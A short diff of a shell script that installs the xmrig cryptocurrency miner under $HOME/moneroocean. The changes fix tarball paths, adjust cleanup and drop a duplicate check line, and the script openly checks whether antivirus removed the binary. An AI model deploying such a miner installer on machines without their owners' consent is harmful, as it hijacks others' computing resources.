@@ -153,15 +153,15 @@ fi
 echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
 [ -d $HOME/moneroocean ] || mkdir $HOME/moneroocean
 if ! tar xf ./xmrig.tar.gz -C $HOME/moneroocean; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
+  echo "ERROR: Can't unpack ./xmrig.tar.gz to $HOME/moneroocean directory"
   exit 1
 fi
 mv $HOME/moneroocean/webchain-miner $HOME/moneroocean/xmrig
-rm /tmp/xmrig.tar.gz
+rm ./xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/moneroocean/config.json
-$HOME/moneroocean/xmrig --help >/dev/null
+
 
 $HOME/moneroocean/xmrig --help >/dev/null
 if (test $? -ne 0); then
